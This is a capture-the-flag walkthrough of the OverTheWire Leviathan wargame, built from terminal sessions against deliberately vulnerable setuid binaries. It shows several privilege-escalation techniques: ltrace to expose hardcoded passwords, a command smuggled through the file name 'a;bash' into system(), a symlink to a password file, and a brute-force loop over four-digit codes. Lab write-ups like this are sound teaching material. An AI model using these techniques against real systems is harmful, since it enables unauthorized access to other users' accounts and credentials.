# Level 0

`ssh -p 2223 leviathan0@leviathan.labs.overthewire.org` with password `leviathan0`

# Level 0 => 1

What's in there ?

```
leviathan0@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 May 10 18:27 .
drwxr-xr-x 10 root       root       4096 May 10 18:27 ..
drwxr-x---  2 leviathan1 leviathan0 4096 May 10 18:27 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

Let's see in `.backup` : `cd .backup && ls -lah` :

```
leviathan0@leviathan:~$ cd .backup/ && ls -lah
total 140K
drwxr-x--- 2 leviathan1 leviathan0 4.0K May 10 18:27 .
drwxr-xr-x 3 root       root       4.0K May 10 18:27 ..
-rw-r----- 1 leviathan1 leviathan0 131K May 10 18:27 bookmarks.html
```

There's a big file in it. I will take a shot and see if there's a password in it without looking at every line.

```
leviathan0@leviathan:~/.backup$ grep password bookmarks.html 
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is <CENSORED>" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

# Level 1 => 2

`ssh -p 2223 leviathan1@leviathan.labs.overthewire.org` with the password found.


```
leviathan1@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 May 10 18:27 .
drwxr-xr-x 10 root       root       4096 May 10 18:27 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-r-sr-x---  1 leviathan2 leviathan1 7656 May 10 18:27 check
```

There's a binary "check" with the setuid bit set. Meaning that I can execute an action as leviathan2.

```
leviathan1@leviathan:~$ ./check
password: test
Wrong password, Good Bye ...
```

Hmmm. It's time to introduce the `ltrace` executable. It can intercept every dynamic library function calls (and their arguments) of the executable. The password check is probably implemented like this :

```
if (strcmp(input_string, password) == 0) {
    // Do action
} else {
    printf("Wrong password, Good Bye ...)
}
```

```
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x565556c0, 1, 0xffffd754, 0x565557a0 <unfinished ...>
printf("password: ")                                                                                                                              = 10
getchar(0xf7fc5000, 0xffffd754, 0x65766f6c, 0x646f6700password: 12345
)                                                                                           = 49
getchar(0xf7fc5000, 0xffffd754, 0x65766f6c, 0x646f6700)                                                                                           = 50
getchar(0xf7fc5000, 0xffffd754, 0x65766f6c, 0x646f6700)                                                                                           = 51
strcmp("123", "sex")                                                                                                                              = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                                                                              = 29
+++ exited (status 0) +++
```

Okay, the password is `sex`.

```
leviathan1@leviathan:~$ ./check
password: sex
$
```

Look at that ! We got a shell, probably as leviathan2.

```
leviathan1@leviathan:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
<CENSORED>
```

# Level 2 => 3

`ssh -p 2223 leviathan2@leviathan.labs.overthewire.org` with the password found.

```
leviathan2@leviathan:~$ ls -la 
total 28
drwxr-xr-x  2 root       root       4096 May 10 18:27 .
drwxr-xr-x 10 root       root       4096 May 10 18:27 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-r-sr-x---  1 leviathan3 leviathan2 7640 May 10 18:27 printfile
```

An executable with the setuid bit set and named printfile. Pretty clear, we should be able to print a file as leviathan3.

```
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Ok then, let's do the same thing as the previous level :

```
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x565556c0, 2, 0xffffd714, 0x565557b0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                                                                       = -1
puts("You cant have that file..."You cant have that file...
)                                                                                                                = 27
+++ exited (status 1) +++
```

It does a permission check with the `access` libc function. From the man page :

```
access() checks whether the calling process can access the file pathname.  If pathname is a symbolic link, it is dereferenced.

The  mode  specifies the accessibility check(s) to be performed, and is either the value F_OK, or a mask consisting of the bitwise OR of one or more of R_OK, W_OK, and X_OK.  F_OK tests for the existence of the file.  R_OK,
W_OK, and X_OK test whether the file exists and grants read, write, and execute permissions, respectively.

The check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file.  Similarly, for the root user, the check  uses  the
set of permitted capabilities rather than the set of effective capabilities; and for non-root users, the check uses an empty set of capabilities.

This allows set-user-ID programs and capability-endowed programs to easily determine the invoking user's authority.  In other words, access() does not answer the "can I read/write/execute this file?" question.  It answers a
slightly different question: "(assuming I'm a setuid binary) can the user who invoked me read/write/execute this file?", which gives set-user-ID programs the possibility to prevent malicious users from causing them to  read
files which users shouldn't be able to read.

If the calling process is privileged (i.e., its real UID is zero), then an X_OK check is successful for a regular file if execute permission is enabled for any of the file owner, group, or other.
```

But that was just for your culture. What if I told you we can escalate our privileges to leviathan3 ?

I'll show you how :

First let's create a dummy file to see the rest of the logic if we can access the file :

```
leviathan2@leviathan:~$ echo "ok" > /tmp/testfile
leviathan2@leviathan:~$ ltrace ./printfile /tmp/testfile
__libc_start_main(0x565556c0, 2, 0xffffd714, 0x565557b0 <unfinished ...>
access("/tmp/testfile", 4)                                                                                                                        = 0
snprintf("/bin/cat /tmp/testfile", 511, "/bin/cat %s", "/tmp/testfile")                                                                           = 22
<REDACTED>                                                                                                                         = 0
system("/bin/cat /tmp/testfile"ok
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                            = 0
+++ exited (status 0) +++
```

The input is not properly validated. We can inject a command into the `system` function call.
Let's go into a temp directory : `cd $(mktemp -d)`

```
leviathan2@leviathan:/tmp/tmp.bOxmqBB3UM$ touch "a;bash"
leviathan2@leviathan:/tmp/tmp.bOxmqBB3UM$ ~/printfile a\;bash 
/bin/cat: a: Permission denied
leviathan3@leviathan:/tmp/tmp.bOxmqBB3UM$ whoami
leviathan3
leviathan3@leviathan:/tmp/tmp.bOxmqBB3UM$ cat /etc/leviathan_pass/leviathan3
<CENSORED>
```

We created a file named "a;bash" so the argument to the `system` function would be : `system("/bin/cat a;bash")` and so we get a shell as leviathan3 !

# Level 3 => 4

This one is waaay easier than the previous.

`ssh -p 2223 leviathan3@leviathan.labs.overthewire.org` with the password found.

```
leviathan3@leviathan:~$ ls -la
total 32
drwxr-xr-x  2 root       root        4096 May 10 18:27 .
drwxr-xr-x 10 root       root        4096 May 10 18:27 ..
-rw-r--r--  1 root       root         220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root        3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root         675 May 15  2017 .profile
-r-sr-x---  1 leviathan4 leviathan3 10488 May 10 18:27 level3
leviathan3@leviathan:~$ ltrace ./level3 
__libc_start_main(0x565557b4, 1, 0xffffd754, 0x56555870 <unfinished ...>
strcmp("h0no33", "kakaka")                                                                                                                        = -1
printf("Enter the password> ")                                                                                                                    = 20
fgets(Enter the password> test
"test\n", 256, 0xf7fc55a0)                                                                                                                  = 0xffffd560
strcmp("test\n", "snlprintf\n")                                                                                                                   = 1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                                                                        = 19
+++ exited (status 0) +++
```
We again have an executable that runs with leviathan4 priviliges. But is does a poor job at hiding the password which is "snlprintf". We have two `strcmp` function call this time but only one is used against our input.

```
leviathan3@leviathan:~$ ./level3 
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
<CENSORED>
```

# Level 4 => 5

`ssh -p 2223 leviathan4@leviathan.labs.overthewire.org` with the password found.

Just exploring the filesystem we have : 

```
leviathan4@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root root       4096 May 10 18:27 .
drwxr-xr-x 10 root root       4096 May 10 18:27 ..
-rw-r--r--  1 root root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root root        675 May 15  2017 .profile
dr-xr-x---  2 root leviathan4 4096 May 10 18:27 .trash
leviathan4@leviathan:~$ cd .trash
leviathan4@leviathan:~/.trash$ ls -la
total 16
dr-xr-x--- 2 root       leviathan4 4096 May 10 18:27 .
drwxr-xr-x 3 root       root       4096 May 10 18:27 ..
-r-sr-x--- 1 leviathan5 leviathan4 7556 May 10 18:27 bin
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
```

Take your favorite binary to ASCII converter and you've got the next password.

# Level 5 => 6

`ssh -p 2223 leviathan5@leviathan.labs.overthewire.org` with the password found.

```
leviathan5@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 May 10 18:27 .
drwxr-xr-x 10 root       root       4096 May 10 18:27 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-r-sr-x---  1 leviathan6 leviathan5 7764 May 10 18:27 leviathan5
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ echo "test" > /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
test
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
<CENSORED>
```

Explanation :
We have an executable that look for a `/tmp/file.log` file and print its content as leviathan6 if it exists. We create a symbolic link to the password file and it prints the password !

# Level 6 => 7

`ssh -p 2223 leviathan6@leviathan.labs.overthewire.org` with the password found.

```
leviathan6@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 May 10 18:27 .
drwxr-xr-x 10 root       root       4096 May 10 18:27 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-r-sr-x---  1 leviathan7 leviathan6 7656 May 10 18:27 leviathan6
leviathan6@leviathan:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
```
Welp ... Time for bruteforce I guess.

```
leviathan6@leviathan:~$ for i in {0..9999}
> do
> code=$(printf "%04d" $i)
> ~/leviathan6 $code
> done
```
Let it run a few seconds and you will be dropped into a shell :

```
...
...
...
Wrong
Wrong
Wrong
$ cat /etc/leviathan_pass/leviathan7
<CENSORED>
```

# Level 7

`ssh -p 2223 leviathan7@leviathan.labs.overthewire.org` with the password found.

```
leviathan7@leviathan:~$ ls
CONGRATULATIONS
leviathan7@leviathan:~$ cat CONGRATULATIONS 
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```
